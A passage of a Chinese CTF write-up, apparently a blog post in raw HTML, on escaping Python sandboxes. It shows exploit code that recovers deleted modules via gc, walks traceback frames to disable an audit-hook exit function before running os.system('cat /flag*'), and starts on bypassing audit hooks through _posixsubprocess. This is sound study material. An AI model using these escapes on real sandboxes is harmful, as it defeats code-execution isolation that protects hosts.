class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;      &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          complie_code = &lt;span class=&#34;built_in&#34;&gt;compile&lt;/span&gt;(input_data, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;string&amp;gt;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;single&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;      &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; SyntaxError &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; err:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(err)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;      &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(complie_code, dict_global)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;      &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; err:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;          &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(err)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;sys.modules[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;module &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt; (built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt;)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;(sys.modules[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__annotations__&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;__builtins__&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;__doc__&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;__loader__&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;__name__&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;__package__&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;__spec__&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaa&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;my_input&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;sys&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;sys.modules[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;].aaa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;bbb&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;除了通过 sys 模块来获取当前模块的变量以及函数外，还可以通过  &lt;code&gt;__builtins__&lt;/code&gt; 篡改内置函数等，这只是一个思路.&lt;/p&gt;
&lt;p&gt;总体来说，只要获取了某个函数或者变量就可以篡改，难点就在于获取.&lt;/p&gt;
&lt;h4 id=&#34;利用-gc-获取已删除模块&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用-gc-获取已删除模块&#34;&gt;#&lt;/a&gt; 利用 gc 获取已删除模块&lt;/h4&gt;
&lt;p&gt;这个思路来源于 &lt;a class=&#34;link&#34; href=&#34;https://github.com/fab1ano/hxp-ctf-20/tree/master/audited&#34;&gt;writeup by fab1ano – github &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这道题的目标是覆盖  &lt;code&gt;__main__&lt;/code&gt;  中的  &lt;code&gt;__exit&lt;/code&gt;  函数，但是题目将  &lt;code&gt;sys.modules[&#39;__main__&#39;]&lt;/code&gt;  删除了，无法直接获取.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; module &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;(sys.modules.keys()):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; module &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; sys.modules:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;del&lt;/span&gt; sys.modules[module]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;gc&lt;/code&gt;  是 Python 的内置模块，全名为 &amp;quot;garbage collector&amp;quot;，中文译为 &amp;quot;垃圾回收&amp;quot;。 &lt;code&gt;gc&lt;/code&gt;  模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。&lt;/p&gt;
&lt;p&gt;Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。 &lt;code&gt;gc&lt;/code&gt;  模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。&lt;/p&gt;
&lt;p&gt;下面是一些  &lt;code&gt;gc&lt;/code&gt;  模块中的主要函数：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;gc.collect(generation=2)&lt;/code&gt; ：这个函数会立即触发一次垃圾回收。你可以通过  &lt;code&gt;generation&lt;/code&gt;  参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gc.get_objects()&lt;/code&gt; ：这个函数会返回当前被管理的所有对象的列表。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gc.get_referrers(*objs)&lt;/code&gt; ：这个函数会返回指向  &lt;code&gt;objs&lt;/code&gt;  中任何一个对象的对象列表。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;exp 如下&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; obj &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; gc.get_objects():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;__name__&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;(obj):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; obj.__name__:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Found module __main__&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            mod_main = obj&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt; == obj.__name__:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Found module os&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            mod_os = obj&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mod_main.__exit = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x : &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] bypass&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.&lt;/p&gt;
&lt;h4 id=&#34;利用-traceback-获取模块&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用-traceback-获取模块&#34;&gt;#&lt;/a&gt; 利用 traceback 获取模块&lt;/h4&gt;
&lt;p&gt;这个思路来源于 &lt;a class=&#34;link&#34; href=&#34;https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md&#34;&gt;writeup by hstocks – github &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;主动抛出异常，并获取其后要执行的代码，然后将 &lt;code&gt;__exit&lt;/code&gt;  进行替换，思路也是十分巧妙.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;raise&lt;/span&gt; Exception()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; e:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _, _, tb = sys.exc_info()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nxt_frame = tb.tb_frame&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# Walk up stack frames until we find one which&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# has a reference to the audit function&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; nxt_frame:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;audit&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; nxt_frame.f_globals:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nxt_frame = nxt_frame.f_back&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# Neuter the __exit function&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nxt_frame.f_globals[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__exit&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# Now we&amp;#x27;re free to call whatever we want&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    os.system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /flag*&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;但是实际测试时使用 python 3.11 发现  &lt;code&gt;nxt_frame = tb.tb_frame&lt;/code&gt;  会触发  &lt;code&gt;object.__getattr__&lt;/code&gt;  hook. 不同的版本中触发 hook 的地方会有差异，这个 payload 可能仅在 python 3.9 (题目版本) 中适用&lt;/p&gt;
&lt;h3 id=&#34;绕过-audit-hook&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过-audit-hook&#34;&gt;#&lt;/a&gt; 绕过 audit hook&lt;/h3&gt;
&lt;p&gt;Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。这些事件的种类及名称不同版本的 Python 解释器有所不同，且可能会随着 Python 解释器的更新而变动。&lt;/p&gt;
&lt;p&gt;Python 中的审计事件包括但不限于以下几类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;import&lt;/code&gt; ：发生在导入模块时。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;open&lt;/code&gt; ：发生在打开文件时。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;write&lt;/code&gt; ：发生在写入文件时。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exec&lt;/code&gt; ：发生在执行 Python 代码时。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;compile&lt;/code&gt; ：发生在编译 Python 代码时。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;socket&lt;/code&gt; ：发生在创建或使用网络套接字时。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;os.system&lt;/code&gt; ， &lt;code&gt;os.popen&lt;/code&gt;  等：发生在执行操作系统命令时。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;subprocess.Popen&lt;/code&gt; ， &lt;code&gt;subprocess.run&lt;/code&gt;  等：发生在启动子进程时。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;calc_jail_beginner_level6 这道题中使用了 audithook 构建沙箱，采用白名单来进行限制.audit hook 属于 python 底层的实现，因此常规的变换根本无法绕过.&lt;/p&gt;
&lt;p&gt;这道题需要绕过的点有两个:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;绕过 import 导入模块。如果直接使用 import, 就会触发 audithook&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; __import__(&amp;#x27;ctypes&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Operation not permitted: import&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;绕过常规的命令执行方法执行命令。利用 os, subproccess 等模块执行命令时也会触发 audithook&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在上文利用 &lt;code&gt;_posixsubprocess.fork.exec&lt;/code&gt;  绕过之外：&lt;/p&gt;
&lt;h4 id=&#34;_posixsubprocess-执行命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_posixsubprocess-执行命令&#34;&gt;#&lt;/a&gt; _posixsubprocess 执行命令&lt;/h4&gt;
&lt;p&gt;_posixsubprocess 模块是 Python 的内部模块，提供了一个用于在 UNIX 平台上创建子进程的低级别接口。subprocess 模块的实现就用到了 _posixsubprocess.&lt;/p&gt;
&lt;p&gt;该模块的核心功能是 fork_exec 函数，fork_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出，每个版本的 Python 可能有所差异.&lt;/p&gt;
&lt;p&gt;在我本地的 Python 3.11 中具体的函数声明如下:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fork_exec&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __process_args: &lt;span class=&#34;type&#34;&gt;Sequence&lt;/span&gt;[StrOrBytesPath] | &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __executable_list: &lt;span class=&#34;type&#34;&gt;Sequence&lt;/span&gt;[&lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;],&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __close_fds: &lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __fds_to_keep: &lt;span class=&#34;built_in&#34;&gt;tuple&lt;/span&gt;[&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;, ...],&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __cwd_obj: &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __env_list: &lt;span class=&#34;type&#34;&gt;Sequence&lt;/span&gt;[&lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;] | &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __p2cread: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __p2cwrite: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __c2pred: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __c2pwrite: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __errread: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __errwrite: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __errpipe_read: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __errpipe_write: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __restore_signals: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __call_setsid: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __pgid_to_set: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __gid_object: SupportsIndex | &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __groups_list: &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;] | &lt;span 